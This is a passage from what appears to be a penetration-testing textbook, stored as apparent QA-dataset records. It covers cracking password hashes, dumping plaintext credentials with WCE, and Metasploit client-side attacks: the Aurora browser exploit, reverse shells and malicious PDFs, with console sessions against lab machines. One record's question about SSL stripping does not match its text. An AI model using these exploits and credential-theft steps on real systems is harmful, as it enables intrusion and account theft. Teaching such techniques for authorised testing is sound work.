4x])\npassword (georgia)\nguesses: 1 time: 0:00:00:00 DONE (Sun Jan 11 05:05:31 2015) c/s: 100\ntrying: password - Password123\nListing 9-16: Cracking Linux hashes with John the Ripper\nUser georgia has an MD5 hash (we can tell from the $1$ at the beginning\nof the password hash). MD5 can’t be brute-forced in a reasonable amount of\ntime. Instead, we use a wordlist with the --wordlist option in John the Ripper. John the Ripper’s success at cracking the password depends on the inclu-\nsion of the correct password in our wordlist. mangling worDlists witH JoHn tHe riPPer\nWhen required by a password policy to include a number and/or a symbol in\na password, many users will just tack them on to the end of a dictionary word . Using John the Ripper’s rules functionality, we can catch this and other common\nmutations that may slip by a simple wordlist . Open the John the Ripper configu-\nration file at /etc/john/john.conf in an editor and search for List.Rules:Wordlist . Beneath this heading, you can add mangling rules for the wordlist . For example,\nthe rule $[0-9]$[0-9]$[0-9] will add three numbers to the end of each word\nin the wordlist . You can enable rules in John the Ripper by using the flag\n--rules at the command line . More information on writing your own rules\ncan be found at http://www.openwall.com/john/doc/RULES.shtml . Cracking Configuration File Passwords\nFinally, let’s try to crack the MD5 hashed passwords we found in the\nFileZilla FTP server configuration file we downloaded with the Zervit 0.4\nfile inclusion vulnerability. As you’ll see, sometimes we don’t even need to\ncrack a password hash. For example, try entering the hash for the user\ngeorgia, 5f4dcc3b5aa765d61d8327deb882cf99, into a search engine. The first\nfew hits confirm that georgia’s password is password. Additionally, searching\ntells us that the account newuser is created when a FileZilla FTP server is\ninstalled with the password wampp. 212 Chapter 9\nNow try logging in to the Windows XP target’s FTP server with these\ncredentials. Sure enough, login is successful. The administrator of this\nsystem forgot to change the default password for the built-in FTP account. If we were not able to recover the plaintext passwords this easily, we could\nagain use John the Ripper with a wordlist, as discussed previously. Rainbow Tables\nRather than taking a wordlist, hashing each entry with the relevant algo-\nrithm, and comparing the resulting hash to the value to be cracked, we\ncan speed up this process considerably by having our wordlist prehashed. This, of course, will take storage space—more with longer hash lists, and\napproaching infinity as we try to store every possible password hash value\nfor brute forcing. A set of precomputed hashes is known as a rainbow table. Rainbow tables\ntypically hold every possible hash entry for a given algorithm up to a certain\nlength with a limited character set. For example, you may have a rainbow\ntable for MD5 hashes that contains all entries that are all lowercase letters\nand numbers with lengths between one and nine. This table is about 80 GB—\nnot so bad with today’s price of storage, but keep in mind this is only a very\nlimited amount of the possible keyspace for MD5. Given its limited keyspace (discussed previously), an LM hash appears\nto be an ideal candidate for using rainbow tables. A full set of LM hash\nrainbow tables is about 32 GB. You can download pregenerated sets of hashes from http://project\n-rainbowcrack.com/table.htm. The tool Rcrack in Kali can be used to sift\nthrough the rainbow tables for the correct plaintext. Online Password-Cracking Services\nThe current hip thing to do in IT is to move things to the cloud, and pass-\nword cracking is no different. By leveraging multiple high-spec machines,\nyou can get faster, more comprehensive results than you could with just\na virtual machine on your laptop. You can, of course, set up up your own\nhigh-powered machines in the cloud, create your own wordlists, and so on,\nbut there are also online services that will take care of this for you for a\nfee. For example, https://www.cloudcracker.com/ can crack NTLM Windows\nhashes, SHA-512 for Linux, WPA2 handshakes for wireless, and more. You\nsimply upload your password hash file, and the cracker does the rest. dumping Plaintext Passwords from memory with\nwindows Credential editor\nWhy bother cracking password hashes if we can get access to plaintext\npasswords? If we have access to a Windows system, in some cases we can pull\nplaintext passwords directly from memory. One tool with this functionality\nis the Windows Credential Editor (WCE). We can upload this tool to an\nexploited target system, and it will pull plaintext passwords from the Local\nPassword Attacks 213\nSecurity Authority Subsystem Service (LSASS) process in charge of enforcing\nthe system’s security policy. You can download the latest version of WCE from\nhttp://www.ampliasecurity.com/research/wcefaq.html.",
    "question": "What is the process for intercepting and capturing sensitive information from an SSL-encrypted connection using a man-in-the-middle attack and SSL stripping?",
    "summary": "This chapter explains how to exploit vulnerabilities found in previous sections to gain access to target systems. It covers techniques like using the MS08-067 exploit, leveraging default credentials in WebDAV and PHPMyAdmin, and exploiting a buffer overflow in third-party software. It also discusses how to bypass login on an FTP server by manipulating SSH keys and how to access password hashes from a compromised system. Additionally, it covers password cracking methods, including using tools like John the Ripper and rainbow tables, and highlights the importance of strong password management."
  },
  {
    "start": 67,
    "end": 73,
    "text": "An example of running\nWCE is shown in Listing 9-17. C:\\>wce.exe -w\nwce.exe -w\nWCE v1.42beta (Windows Credentials Editor) - (c) 2010-2013 Amplia Security - by Hernan Ochoa\n(hernan@ampliasecurity.com)\nUse -h for help. georgia\\BOOKXP:password\nListing 9-17: Running WCE\nHere WCE found the plaintext of the user georgia’s password. The\ndownside to this attack is that it requires a logged-in user for the password\nto be stored in memory. Even if you were able to get a plaintext password or\ntwo with this method, it is still worth dumping and attempting to crack any\npassword hashes you can access. summary\nReversing password hashes is an exciting field, and as the speed of hard-\nware increases, it becomes possible to crack stronger hashes faster. Using\nmultiple CPUs and even the graphics processing units (GPUs) on video\ncards, password crackers can try many hashes very quickly. Our virtual\nmachines don’t have much processing power, but even your average modern\nlaptop is much faster than the machines that were used for password crack-\ning just a few short years ago. The cutting edge of password cracking these\ndays is taking to the cloud and harnessing multiple top-spec cloud servers\nfor cracking. You’ll even find some cloud-based password-cracking services. As you’ve seen in this chapter, using information gathered from suc-\ncessful exploits in Chapter 8, we’ve managed to reverse password hashes\nto recover plaintext passwords for some services and the systems themselves. Having managed to get a foothold on the systems, let’s look at some advanced\nattack methods that can help us if we can’t find anything vulnerable when\nlistening on the network. We still have the Windows 7 machine to exploit,\nafter all. 214 Chapter 9\n10\nClient-siDe e xPloitation\nThe vulnerabilities we’ve studied so far have been\nlow-hanging fruit, and all have come up on real\nengagements. It’s common on penetration tests to\nfind vulnerable services listening on ports, unchanged\ndefault passwords, misconfigured web servers, and\nso on. However, clients who put a lot of time and effort into their security pos-\nture may be free from these kinds of vulnerabilities. They may have all secu-\nrity patches in place; they may periodically audit passwords and remove any\nthat can be easily guessed or cracked. They may control user roles: Regular\nusers may not have administrative rights on their workstations, and any soft-\nware that is installed is investigated and maintained by the security staff. As\na result, there may not be many services to even try to attack. Yet, despite the deployment of the latest and greatest security technolo-\ngies and the employment of crack security teams, high-profile companies\n(with potentially high payoffs for attackers) are still being breached. In this\nchapter we’ll examine a few different kinds of attacks that don’t require\ndirect network access. We’ll study attacks that target local software on a\nsystem—software that is not listening on a port. Because we won’t attack a computer or listening port directly, and\nbecause we need to come up with another way to attack a device inside a\ncorporate perimeter, we need to select our payload accordingly. Whereas\na normal bind shell might work fine for systems directly exposed to the\nInternet or listening on a port on our local network, we will at the very least\nbe limited to reverse connections here. But first let’s dive a little deeper into the Metasploit payload system and\ncheck out some other payloads that may be useful to you. Bypassing Filters with metasploit Payloads\nIn previous chapters we discussed the Metasploit payload system, including\nsingle versus staged payloads and bind shells versus reverse shells. We also\ntalked briefly about Metasploit’s Meterpreter payload (which we’ll discuss in\ndepth in Chapter 13). When you use the command show payloads on a mod-\nule, you may see several payloads that may be new to you. We’ll look at a\nfew in this section that can be used to bypass filtering technologies you may\nencounter on your pentests. All Ports\nOur network is set up such that our attack and target virtual machines are\non the same network with no firewalls or other filters blocking communica-\ntions. However, in your pentesting career, you may encounter clients with\nall sorts of filtering setups. Even a reverse connection may not be able to\nget through the filters and connect back to your attack machine on just\nany port. For example, a client network may not allow traffic to leave the\nnetwork on port 4444, the default for Metasploit reverse_tcp payloads. It may\nallow traffic out only on specific ports, such as 80 or 443 for web traffic. If we know which ports are allowed through the filter, we can set the\nLPORT option to the relevant port. The Metasploit reverse_tcp_allports payloads\ncan help us find a port to connect to. As the name suggests, this payload\ncommunication method will try all ports until it finds a successful connec-\ntion back to Metasploit. Let’s test this functionality with the windows/shell/reverse_tcp_allports pay-\nload, as shown in Listing 10-1. We are using the MS08-067 exploit against\nWindows XP. msf exploit(ms08_067_netapi) > set payload windows/shell/reverse_tcp_allports\npayload => windows/shell/reverse_tcp_allports\nmsf exploit(ms08_067_netapi) > show options\n--snip--\nPayload options (windows/shell/reverse_tcp_allports):\n216 Chapter 10\nName Current Setting Required Description\n---- --------------- -------- -----------\nEXITFUNC thread yes Exit technique: seh, thread, process, none\nLHOST 192.168.20.9 yes The listen address\nuLPORT 1 yes The starting port number to connect back on\n--snip--\nmsf exploit(ms08_067_netapi) > exploit\n[*] Started reverse handler on 192.168.20.9:1\n--snip--\n[*] Sending encoded stage (267 bytes) to 192.168.20.10\n[*] Command shell session 5 opened (192.168.20.9:1 -> 192.168.20.10:1100) at 2015-05-14\n22:13:20 -0400 v\nListing 10-1: Windows/shell/reverse_tcp_allports payload\nHere, the LPORT u option specifies the first port to try. If that port doesn’t\nwork, the payload will try each subsequent port until the connection suc-\nceeds. If the payload reaches 65535 without success, it starts trying again at\nport 1 and runs infinitely. Because there is no filter blocking our traffic, the first port Metasploit\ntries, port 1, creates a successful connection, as shown at v. Though this\npayload will work in many cases, some filtering technologies will be able\nto stop it regardless of the port it tries to connect to. One downside to this\npayload is that it may run for a long time in an attempt to find an unfiltered\nport. If a user sees the application hanging, he or she may close it before\nthe payload is successful. HTTP and HTTPS Payloads\nWhile some filters may allow all traffic out on certain ports, the most\nadvanced filtering systems use content inspection to screen for legitimate\nprotocol-specific traffic. This can pose a problem for our payloads. Even\nthough our Meterpreter payload communication is encrypted—the content\ninspection won’t be able to say, “That’s Metasploit, go away!”—the filter will\nbe able to tell that the traffic going out on port 80 doesn’t meet the HTTP\nspecification. To address this challenge, the developers of Metasploit created HTTP\nand HTTPS payloads. These payloads follow the HTTP and HTTPS speci-\nfications so that even content-inspection filters will be convinced that our\ntraffic is legitimate. Also, these payloads are packet based, rather than\nstream based like the TCP payloads. That means they aren’t limited to a\nspecific connection. If you lose network communication briefly and lose all\nyour Metasploit sessions, HTTP and HTTPS sessions can recover and recon-\nnect. (We’ll see an example using these payloads in “Java Vulnerability” on\npage 230.)\nClient-Side Exploitation 217\nThough HTTP and HTTPS payloads will get you through most filter-\ning technologies, you may find yourself in an even more complex filtering\nsituation. For example, I tested one client where only the Internet Explorer\nprocess, when started by a domain-authenticated user, could reach the\nInternet. Employees could browse the Internet to perform their business,\nbut they were somewhat limited. For instance, they couldn’t use an instant\nmessenger client. While this probably annoyed some employees, it was a\ngood idea for security reasons. Even if we had been able to successfully\nexploit something, even HTTP and HTTPS payloads could not get out to\nthe Internet. (In “Browser Exploitation” on page 219, we’ll look at some\nattack methods that would allow us to exploit the Internet Explorer process\nwhen a legitimate domain user is logged in and then connect to the outside\nworld.)\nMeterpreter HTTP and Meterpreter HTTPS use the proxy settings\nof Internet Explorer to navigate any proxies necessary to call out to the\nInternet. For this reason, if your target process is running as the System\nuser, these proxy settings may not be defined, and these payloads may fail. note There is also a Meterpreter payload, reverse_https_proxy, that allows the attacker\nto manually add in any necessary proxy settings. Client-side attacks\nNow let’s turn our attention to running client-side attacks. Instead of directly\nattacking a service listening on a port, we’ll create a variety of malicious\nfiles that, when opened in vulnerable software on the target machine, will\nresult in a compromise. So far all of our attacks have involved some sort of service listening on\na port, be it a web server, FTP server, SMB server, or otherwise. When we\nbegan our pentest, one of the first things we did was port scan our targets\nto see which services were listening. When we start a pentest, the potential\nvulnerabilities are practically limitless. As we begin running tools, performing manual analysis, and research-\ning, the exploitation possibilities gradually decrease until we’re left with\na limited number of issues on the target systems. Those issues have been\nserver-side issues—services listening on ports. What we are missing is any\npotentially vulnerable software that is not listening on a port—client-side\nsoftware. Software like web browsers, document viewers, music players, and so on\nare subject to the same sort of issues as web servers, mail servers, and every\nother network-based program. 218 Chapter 10\nOf course, because client-side software isn’t listening on the network,\nwe can’t directly attack it, but the general principle is the same. If we can\nsend unexpected input to a program to trigger a vulnerability, we can\nhijack execution, just as we exploited server-side programs in Chapter 8. Because we can’t send input to client-side programs directly over the net-\nwork, we must entice a user to open a malicious file. As security is taken more seriously and server-side vulnerabilities become\nmore difficult to find from an Internet-facing perspective, client-side exploita-\ntion is becoming key to gaining access to even carefully protected internal\nnetworks. Client-side attacks are ideal for assets such as workstations or\nmobile devices that lack an Internet-facing IP address. Though from the\nperspective of the Internet we can’t directly access those systems, they can\ntypically call out to the Internet, or to a pentester-controlled system, if we\ncan hijack execution. Unfortunately, the success of client-side attacks relies on somehow\nmaking sure that our exploit is downloaded and opened in a vulnerable\nproduct. In the next chapter, we’ll look at some techniques to lure users\ninto opening malicious files; for now we’ll look at some client-side exploits,\nbeginning with what must be the most popular target for client-side exploi-\ntation: web browsers. Browser Exploitation\nWeb browsers are made up of code to render web pages. Just as we can send\nmalformed input to server software, if we open a web page with malicious\ncode to trigger a security issue, we can potentially hijack execution in the\nbrowser and execute a payload. Though the delivery is a bit different, the fun-\ndamental concept is the same. All of the most common browsers have been\nsubject to security issues—Internet Explorer, Firefox, and even Mobile Safari. iPHone JailBreaking Via Browser exPloitation\nIn the past, browser exploitation has been instrumental in iPhone jailbreak-\ning . While later versions of iOS implement a security feature called mandatory\ncode signing, which requires that all executed code be approved by Apple,\nMobile Safari (the web browser on the iPhone) gets a pass because to render\nweb pages, it must be able to run unsigned code . Apple can’t go through all the\npages on the Internet and sign everything that doesn’t contain malicious code . And if the iPhone can’t view web pages, everyone will just go buy an Android\nphone—the last thing Apple wants . When iOS 4 renders PDF documents in\nMobile Safari, one of the fonts includes a security vulnerability . This client-side\nattack allows jailbreakers to gain a foothold on iPhones just by tricking a user\ninto opening a malicious link in the browser . Client-Side Exploitation 219\nLet’s consider a famous vulnerability in Internet Explorer.\n\nThe Aurora\nexploit was used in 2010 against major companies such as Google, Adobe,\nand Yahoo!. At the time of the Aurora attacks, Internet Explorer contained a\nzero-day vulnerability—that is, a vulnerability that had not yet been patched. (Even a fully updated version of Internet Explorer could be compromised\nif a user could be tricked into opening a malicious web page, triggering the\nvulnerability.)\nMicrosoft has released patches for Internet Explorer, but as with other\nsecurity patches, users sometimes overlook updating their browsers, and the\nversion of Internet Explorer installed on the Windows XP target doesn’t have\nthe necessary security patch to protect against the Aurora exploit. We’ll use Metasploit to take control of a target machine by attacking a\nvulnerable browser using the Aurora Metasploit module, exploit/windows/\nbrowser/ms10_002_aurora, shown in Listing 10-2. note Client-side Metasploit modules are fundamentally the same as the server-side mod-\nules we have used so far, except that the options are a bit different: Instead of sending\nexploits to a remote host on the network, we set up a server and wait for a browser to\naccess our page. msf > use exploit/windows/browser/ms10_002_aurora\nmsf exploit(ms10_002_aurora) > show options\nModule options (exploit/windows/browser/ms10_002_aurora):\nName Current Setting Required Description\n---- --------------- -------- -----------\nuSRVHOST 0.0.0.0 yes The local host to listen on. This must be an address\non the local machine or 0.0.0.0\nvSRVPORT 8080 yes The local port to listen on. wSSL false no Negotiate SSL for incoming connections\nSSLCert no Path to a custom SSL certificate (default is randomly\ngenerated)\nSSLVersion SSL3 no Specify the version of SSL that should be used\n(accepted: SSL2, SSL3, TLS1)\nxURIPATH no The URI to use for this exploit (default is random)\nExploit target:\nId Name\n-- ----\ny0 Automatic\nListing 10-2: Internet Explorer Aurora Metasploit module\nNotice in the options for the module that instead of RHOST we see the\nSRVHOST u option. This is the local IP address for the server. By default this\naddress is set to 0.0.0.0 to listen on all addresses on the local system. The\n220 Chapter 10\ndefault port to listen on, the SRVPORT v option, is 8080. You can change this\nport number to 80 (the default port for web servers) as long as no other\nprogram is using the port. You can even use an SSL connection w. If we set the URIPATH x option, we can specify a specific URL for the\nmalicious page. If we don’t set anything here, a random URL will be used. Because the exploitation will take place entirely inside the browser, our\nexploit will work regardless of the version of Windows running y, as long\nas Internet Explorer is subject to the Aurora vulnerability. Next we set the module options for our environment. The payloads\nfor this module are the same as the Windows payloads we’ve already seen. Exploiting the browser is no different from exploiting any other program\non the system, and we can run the same shellcode. We’ll use the windows/\nmeterpreter/reverse_tcp payload for this example to illustrate some client-side\nattack concepts, as shown in Listing 10-3. note Make sure the apache2 web server is not running on port 80 with service\napache2 stop. msf exploit(ms10_002_aurora) > set SRVHOST 192.168.20.9\nSRVHOST => 192.168.20.9\nmsf exploit(ms10_002_aurora) > set SRVPORT 80\nSRVPORT => 80\nmsf exploit(ms10_002_aurora) > set URIPATH aurora\nURIPATH => aurora\nmsf exploit(ms10_002_aurora) > set payload windows/meterpreter/reverse_tcp\npayload => windows/meterpreter/reverse_tcp\nmsf exploit(ms10_002_aurora) > set LHOST 192.168.20.9\nLHOST => 192.168.20.9\nmsf exploit(ms10_002_aurora) > exploit\n[*] Exploit running as background job. [*] Started reverse handler on 192.168.20.9:4444 u\n[*] Using URL: http://192.168.20.9:80/aurora v\n[*] Server started. Listing 10-3: Setting options and launching the Aurora module\nAs you can see in Listing 10-3, once we’ve set the options and run the\nmodule, a web server is started in the background on the selected SRVPORT at\nthe selected URIPATH as shown at v. Additionally, a handler is set up for the\nselected payload u. Now we’ll use Internet Explorer on the Windows XP target to browse\nto the malicious site. In Metasploit you should see that the page has been\nserved and is attempting to exploit the vulnerability, as shown in Listing 10-4. Although our Windows XP browser is vulnerable, it may take a couple tries\nto exploit the browser successfully. Exploiting the Aurora vulnerability is not as reliable as exploiting the\nother vulnerabilities we’ve discussed so far in this book. If Internet Explorer\ncrashes, but you do not receive a session, try browsing to the exploit page\nagain. Client-Side Exploitation 221\nmsf exploit(ms10_002_aurora) > [*] 192.168.20.10 ms10_002_aurora -\nSending Internet Explorer \"Aurora\" Memory Corruption\n[*] Sending stage (752128 bytes) to 192.168.20.10\n[*] Meterpreter session 1 opened (192.168.20.9:4444 -> 192.168.20.10:1376) at\n2015-05-05 20:23:25 -0400 u\nListing 10-4: Receiving a client-side session\nThough this exploit may not work every time, the target browser is vul-\nnerable and a couple of tries should do it. If the exploit succeeds, you will\nreceive a session, as shown at u. We are not automatically dropped into the\nsession. Use sessions -i <session id> to interact with the Meterpreter session. Though we have successfully exploited the browser and gained a foot-\nhold on the target system, our challenges are not over. If you look back at the\nWindows XP machine and try to continue using Internet Explorer, you’ll find\nthat it’s no longer functioning. The exploitation involved in getting our ses-\nsion has made the browser unusable. The problem for us is that users who\nhave been tricked into visiting our malicious site will naturally want to con-\ntinue using their browsers. They may force-quit the browser, or the browser\nmay crash on its own due to its unstable state. When the browser closes, we\nlose our Meterpreter session. msf exploit(ms10_002_aurora) > [*] 192.168.20.10 - Meterpreter session 1 closed. Reason: Diedu\nOur Meterpreter payload resides entirely inside the memory of the\nexploited process. If the browser dies or is closed by the user, our session\nalso dies, as you can see at u. We can lose our foothold on the system just\nas quickly as we gained it. We need a way to keep our Meterpreter session alive, even if the exploited\nprocess—in this case, the Internet Explorer browser—dies. But first, we\nneed to stop our Metasploit web server so we can make some changes to the\nmalicious page to fix this problem, as shown in Listing 10-5. msf exploit(ms10_002_aurora) > jobsu\nJobs\n====\nId Name\n-- ----\n0 Exploit: windows/browser/ms10_002_aurora\nmsf exploit(ms10_002_aurora) > kill 0v\nStopping job: 0... [*] Server stopped. Listing 10-5: Killing a background job in Metasploit\nWe can see everything running in the background in Metasploit by enter-\ning jobs u. To stop a job running in the background, enter kill <job number> v. 222 Chapter 10\nBecause Meterpreter lives entirely inside the memory of the exploited\nprocess and that process is doomed to die, we need some way to move our\nsession out of the Internet Explorer process and into one that is more likely\nto stick around. Running Scripts in a Meterpreter Session\nUnlike network attacks, where we will see a session right away if our attack\nsucceeds, when performing client-side attacks, we must wait until a user\naccesses our malicious page. Even if we find a way to move Meterpreter into\nanother process, sessions could come in at any time. We can’t be distracted\nat any point during our pentest or we risk losing a session. It would be ideal\nif we could automatically run commands in our Meterpreter session so that\nwe don’t have to sit idly, waiting for a browser to access our malicious server. Meterpreter scripts that can be run in an open session can be found at\n/usr/share/metasploit-framework/scripts/meterpreter in Kali. We’ll look at more\nexamples of Meterpreter scripts in Chapter 13, but for now let’s look at one\nspecific Meterpreter script that will work well with our current scenario. The\nscript migrate.rb allows us to move Meterpreter from the memory of one pro-\ncess to another, which is exactly what we need here. To run a Meterpreter\nscript inside an active Meterpreter session, enter run <script name>, as shown\nin Listing 10-6. You may be presented with help information about how to\nuse the script correctly, as we are shown here. meterpreter > run migrate\n\nOPTIONS:\n-f Launch a process and migrate into the new process u\n-h Help menu. -k Kill original process. -n <opt> Migrate into the first process with this executable name (explorer.exe) v\n-p <opt> PID to migrate to. w\nListing 10-6: Running a Meterpreter script\nWhen we attempt to run the migrate script, we see a few options. We can\nlaunch a new process and migrate into that process, as shown at u; migrate\ninto a process with a given name v; or choose the process by process ID, as\nshown at w. advanced Parameters\nIn addition to the module and payload options, Metasploit modules have\nadvanced parameters. We can see the available advanced parameters with\nthe command show advanced, as shown in Listing 10-7. msf exploit(ms10_002_aurora) > show advanced\nModule advanced options:\nClient-Side Exploitation 223\nName : ContextInformationFile\nCurrent Setting:\nDescription : The information file that contains context information\n--snip--\nName : AutoRunScriptu\nCurrent Setting:\nDescription : A script to run automatically on session creation. --snip--\nName : WORKSPACE\nCurrent Setting:\nDescription : Specify the workspace for this module\nListing 10-7: Metasploit advanced parameters\nOne of the advanced settings for our chosen payload is AutoRunScript u. When set, this setting will allow us to automatically run a Meterpreter script\nwhen a session opens. We can set this parameter to automatically run the migrate script when\na Meterpreter session opens. This way, when the browser dies, as long as\nthe migrate script has finished, our session will be safe from the crash. Additionally, by running the script automatically, we can migrate whenever\na user accesses the malicious page, regardless of whether you have your eyes\non Msfconsole when the session comes in, as shown in Listing 10-8. msf exploit(ms10_002_aurora) > set AutoRunScript migrate -fu\nAutoRunScript => migrate -f\nmsf exploit(ms10_002_aurora) > exploit\n[*] Exploit running as background job. [*] Started reverse handler on 192.168.20.9:4444\n[*] Using URL: http://192.168.20.9:80/aurora\n[*] Server started. Listing 10-8: Setting the AutoRunScript parameter\nTo set advanced parameters, use the syntax set <parameter to set> <value>\n(the same as setting regular options). For example, in Listing 10-8, we tell\nthe migrate script to spawn a new process to migrate into with the -f flag u,\nand then we start the malicious server again. Now browse to the malicious page from the Windows XP target again\n(see Listing 10-9). msf exploit(ms10_002_aurora) > [*] 192.168.20.10 ms10_002_aurora - Sending Internet\nExplorer \"Aurora\" Memory Corruption\n[*] Sending stage (752128 bytes) to 192.168.20.10\n[*] Meterpreter session 2 opened (192.168.20.9:4444 -> 192.168.20.10:1422) at 2015-05-05 20:26:15 -0400\n[*] Session ID 2 (192.168.20.9:4444 -> 192.168.20.10:1422) processing AutoRunScript 'migrate -f' u\n[*] Current server process: iexplore.exe (3476)\n224 Chapter 10\n[*] Spawning notepad.exe process to migrate to\n[+] Migrating to 484\n[+] Successfully migrated to process v\nListing 10-9: Automatically migrating\nThis time we get a session saying that the AutoRunScript parameter is pro-\ncessed automatically u. The migrate script spawns a notepad.exe process and\nmoves into it v. When Internet Explorer dies, our session remains alive. Though automatically migrating is a good idea when using a browser\nexploit, it still takes a few seconds for the migration to happen—seconds\nduring which the user could close the browser and kill our session. Fortunately,\nthe advanced Meterpreter option PrependMigrate, shown here, will migrate\neven faster, before the payload is run. Name : PrependMigrate\nCurrent Setting: false\nDescription : Spawns and runs shellcode in new process\nYou can set this option to true as an alternative to the AutoRunScript we\nused earlier. This has been just one example of a browser exploit. Metasploit has\nother modules for exploiting vulnerabilities in Internet Explorer as well\nas other popular web browsers. As more organizations have hardened their\nexternal security posture, browser exploitation has given over the keys to\nthe kingdom in many pentests as well as attacks. note The Aurora vulnerability was patched in 2010, but users and organizations are\nbad at keeping their browsers up to date, so this exploit still finds targets today. Additionally, though new remote exploits for operating systems are rare, major\nbrowsers such as Internet Explorer fall victim to new client-side attacks on a regular\nbasis. Use Msfupdate as discussed in Chapter 4 to get the latest modules for new\nvulnerabilities, some of which may not even be patched by the vendor at the time of\nthe module’s release. Note that running Msfupdate may affect how Metasploit works,\nwhich may make it more difficult to follow along with the book. Therefore, you may\nnot want to update Metasploit until after you have read through the book. Now let’s look at some other client-side software that can be exploited\nto gain command execution on a target system. PDF Exploits\nPortable Document Format (PDF) software can also be exploited. If a\nuser can be enticed to open a malicious PDF in a vulnerable viewer, the\nprogram can be exploited. The most popular PDF viewer for Windows systems is Adobe Reader. Like browsers, Adobe Reader has a history littered with security holes. Also\nlike browsers, even when a patch-management process is in place, regu-\nlarly updating the underlying operating system, PDF software is often for-\ngotten, and remains at an older, vulnerable version. Client-Side Exploitation 225\nExploiting a PDF Vulnerability\nOur Windows XP target has an outdated version of Adobe Reader 8.1.2\ninstalled that is subject to CVE-2008-2992, a stack-based buffer over-\nflow. The corresponding Metasploit module is exploit/windows/fileformat/\nadobe_utilprintf. The options for this module are a bit different than anything we’ve\nseen thus far, as shown in Listing 10-10. This is a client-side attack, so there\nis no RHOST option, but unlike our browser attack, there are also no SRVHOST\nor SRVPORT options. This module simply creates a malicious PDF; hosting it\nfor delivery and setting up a payload handler is up to us. Of course, we have\nall the skills necessary to perform both these tasks easily. msf > use exploit/windows/fileformat/adobe_utilprintf\nmsf exploit(adobe_utilprintf) > show options\nModule options (exploit/windows/fileformat/adobe_utilprintf):\nName Current Setting Required Description\n---- --------------- -------- -----------\nuFILENAME msf.pdf yes The file name. Exploit target:\nId Name\n-- ----\nv0 Adobe Reader v8.1.2 (Windows XP SP3 English)\nmsf exploit(adobe_utilprintf) > exploit\n[*] Creating 'msf.pdf' file... [+] msf.pdf stored at /root/.msf4/local/msf.pdf w\nListing 10-10: A Metasploit PDF exploit\nAs you can see, the only option for the PDF exploit is the name of the\nmalicious file to be generated u. We can leave the default, msf.pdf. For this\nexample, we’ll have Metasploit use the default payload, windows/meterpreter/\nreverse_tcp on port 4444. When we enter exploit, Metasploit generates a PDF\nthat will exploit this vulnerability in a vulnerable version of Adobe Reader\non Windows XP SP3 English v. The malicious PDF is stored as /root/.msf4/\nlocal/msf.pdf w. Now we need to serve the PDF and set up a handler for the payload, as\nshown in Listing 10-11. msf exploit(adobe_utilprintf) > cp /root/.msf4/local/msf.pdf /var/www\n[*] exec: cp /root/.msf4/local/msf.pdf /var/www\nmsf exploit(adobe_utilprintf) > service apache2 start\n[*] exec service apache2 start\n226 Chapter 10\nStarting web server: apache2. msf exploit(adobe_utilprintf) > use multi/handleru\nmsf exploit(handler) > set payload windows/meterpreter/reverse_tcp\npayload => windows/meterpreter/reverse_tcp\nmsf exploit(handler) > set LHOST 192.168.20.9\nlhost => 192.168.20.9\nmsf exploit(handler) > exploit\n[*] Started reverse handler on 192.168.20.9:4444\n[*] Sending stage (752128 bytes) to 192.168.20.10\n[*] Meterpreter session 2 opened (192.168.20.9:4444 -> 192.168.20.10:1422) at\n2015-05-05 20:26:15 -0400 v\nListing 10-11: Serving the malicious PDF and using a handler\nWe copy the file to the Apache web server folder and start the server,\nif it is not already running. We’ll look at ways to lure users into opening\nmalicious files later in this chapter, but for now we’ll just open the mali-\ncious PDF in Adobe Reader 8.1.2 on our Windows XP target. First, though,\nwe need to set up a handler for the payload. We can use the multi/handler u\nmodule as we learned in Chapter 4. (Be sure to kill the Aurora job if its\nhandler is also listening on port 4444 to free up this port for multi/handler\nuse). When we open the malicious PDF, we again receive a session v. Typically with an attack like this we won’t be targeting just one user. For\nbest results we might use this malicious PDF as part of a social-engineering\ncampaign, as discussed in the next chapter, by sending out a few to even hun-\ndreds of malicious PDFs in an attempt to entice users to open them. The\nmulti/handler listener we set up previously will close as soon as it sees the\nfirst connection, causing us to miss any other connections that come in from\nother users opening the PDF. It would be much better if we could leave our\nlistener open to catch additional incoming connections. As it turns out, an advanced option for the multi/handler module solves\nthis problem. As shown in Listing 10-12, the advanced option ExitOnSession,\nwhich is set to true by default, specifies whether the listener closes after it\nreceives a session. If we set this option to false, the listener will stay open\nand allow us to catch multiple sessions with a single handler. msf exploit(handler) > show advanced\nModule advanced options:\n--snip--\nName : ExitOnSession\nCurrent Setting: true\nDescription : Return from the exploit after a session has been created\nmsf exploit(handler) > set ExitOnSession falseu\nExitOnSession => false\nmsf exploit(handler) > exploit -jv\n[*] Exploit running as background job. [*] Started reverse handler on 192.168.20.9:4444\n[*] Starting the payload handler... Listing 10-12: Keeping the handler open for multiple sessions\nClient-Side Exploitation 227\nSet ExitOnSession to false in the usual way u. One side effect of this\noption is that if we, say, exploit and start the listener in the foreground,\nit will never close, so we will be stuck without an Msfconsole prompt\nindefinitely. For this reason, Metasploit will complain and note that you\nshould use the -j option with exploit v to run the handler as a job, in the\nbackground. This way you can continue to use Msfconsole while the handler\ncatches any incoming shells in the background. To close the handler in\nthe future, use jobs, followed by kill <job number> as we did in the Aurora\nexample. This exploit and the Aurora browser example discussed earlier both\nrely on a missing security patch. Here we’ve exploited a security vulnerabil-\nity to hijack control of the program and execute malicious code by tricking\nthe user into letting us run malicious code. If the user will allow us to run\ncode, a vulnerability in the PDF software becomes unnecessary. PDF Embedded Executable\nNow for another PDF attack: This time we’ll embed a malicious executable\ninside a PDF. The corresponding Metasploit module is exploit/windows/\nfileformat/adobe_pdf_embedded_exe, as shown in Listing 10-13.\n\nInstead of\nexploiting the software as soon as the PDF is opened, the generated PDF\nwill prompt the user for permission to run the embedded file. The success\nof our attack is contingent on the user allowing our executable to run. msf > use exploit/windows/fileformat/adobe_pdf_embedded_exe\nmsf exploit(adobe_pdf_embedded_exe) > show options\nModule options (exploit/windows/fileformat/adobe_pdf_embedded_exe):\nName Current Setting Required Description\n---- --------------- -------- -----------\nuEXENAME no The Name of payload exe. vFILENAME evil.pdf no The output filename. wINFILENAME yes The Input PDF filename. xLAUNCH_MESSAGE To view the encrypted content please no The message to display in\ntick the \"Do not show this message the File: area\nagain\" box and press Open. --snip--\nListing 10-13: PDF embedded EXE module\nThe module lets us specify a prebuilt executable file with the EXENAME u\noption. If we don’t set this option, we can embed an .exe file created from\nwhatever payload we select. We can again change the filename to anything\nwe like or leave the value as the default v. To use this module, we must\nuse an input PDF for the INFILENAME w option. The LAUNCH_MESSAGE x option\nis the text that will be shown to the user as part of the prompt to run the\nexecutable. Set the relevant options, as shown in Listing 10-14. 228 Chapter 10\nmsf 